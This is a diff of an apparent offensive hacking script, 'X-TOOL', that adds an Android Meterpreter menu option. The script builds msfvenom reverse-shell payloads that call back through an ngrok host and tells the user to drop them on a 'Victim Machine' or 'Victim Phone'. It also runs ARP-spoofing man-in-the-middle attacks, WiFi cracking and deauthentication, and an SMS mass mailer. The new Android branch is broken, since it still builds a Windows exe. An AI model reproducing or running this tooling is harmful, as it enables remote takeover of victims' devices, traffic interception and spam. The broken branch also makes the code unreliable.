@@ -30,10 +30,11 @@ print('[*] X-TOOL Exploits:')
 print('[1] Eternal Blue')
 print('[2] Eternal Blue Win10')
 print('[3] Deauth WiFi network')                                             #Exploits
-print('[4] Meterpreter Over Wan')
-print('[5] MITM Attack (Man in the middle Attack) (Using MITMf)')
-print('[6] Crack Wifi network password!')
-print('[7] SMS Mass Mailer')
+print('[4] Windows Meterpreter Over Wan')
+print("[5] Android Meterpeter Over Wan")
+print('[6] MITM Attack (Man in the middle Attack) (Using MITMf)')
+print('[7] Crack Wifi network password!')
+print('[8] SMS Mass Mailer')
 print('')
 query = input("[*] Choose exploit!:").lower()                                       
 if query.startswith('1'):
@@ -77,19 +78,31 @@ if query.startswith('3'):
 	os.system(aireplay)
 if query.startswith('4'):
 	print('')
-	print('Check and remember Ngrok PORT!')
-	print('Dont close Ngrok window!')
-	os.system("xterm -hold -e ngrok tcp 4444 &")
+	print('Open another terminal and start Ngrok with tcp port 4444 (ngrok tcp 4444)')
 	NgrokPort = input('Write Ngrok Port!:')
 	PayloadFile = input('What name of file you want? (Dont forget to write .exe):')
-	msfvenom = ('msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=') + (NgrokPort) + (' -b "\\x00" -e x86/shikata_ga_nai -f exe -o') + (PayloadFile)
+	msfvenom = ('cd && msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=') + (NgrokPort) + (' -b "\\x00" -e x86/shikata_ga_nai -f exe -o') + (PayloadFile)
 	os.system(msfvenom)
-	print('Payload File locate on your Desktop! Drop this to Victim Machine!')
+	print('Payload File locate on your home directory! Drop this to Victim Machine!')
 	postgresql = ('service postgresql start')
 	os.system(postgresql)
 	msfMeter = ('msfconsole  -q -x "set payload windows/meterpreter/reverse_tcp; set lhost 0.0.0.0; set LPORT 4444; use multi/handler; exploit"')
 	os.system(msfMeter)
 if query.startswith('5'):
+	print('')
+	print('Open another terminal and start Ngrok with tcp port 4444 (ngrok tcp 4444)')
+	NgrokPort = input('Write Ngrok Port!:')
+	PayloadFile = input('What name of file you want? (Dont forget to write .apk):')
+	msfvenom = ('cd && msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=') + (NgrokPort) + (' -b "\\x00" -e x86/shikata_ga_nai -f exe -o') + (PayloadFile)
+	os.system(msfvenom)
+	print('Payload File locate on your home directory Drop this to Victim Phone!')
+	postgresql = ('service postgresql start')
+	os.system(postgresql)
+	msfMeter = ('msfconsole  -q -x "set payload windows/meterpreter/reverse_tcp; set lhost 0.0.0.0; set LPORT 4444; use multi/handler; exploit"')
+	os.system(msfMeter)
+
+
+if query.startswith('6'):
 	print('')
 	print('Check and remember gateway IP!')
 	os.system('netstat -rn')
@@ -97,12 +110,12 @@ if query.startswith('5'):
 	RouterIP = input('Enter Gateway IP!:')
 	MITM = ('python mitmf.py -i ') + (Interface) + (' --spoof --arp --gateway ') + (RouterIP) + (' --upsidedownternet')
 	os.system(MITM)
-if query.startswith('6'):
+if query.startswith('7'):
 	print('You must put your dict in X-TOOL folder!')
 	dictionary = input('Enter name of dictionary file!:')
 	Cracking = ('wifite --dict ') + (dictionary)
 	os.system(Cracking)
-if query.startswith('7'):
+if query.startswith('8'):
 	print("Welcome to SMS Mailer!")
 	print("Spoofer was writen by TheSpeedX")
 	time.sleep(5)
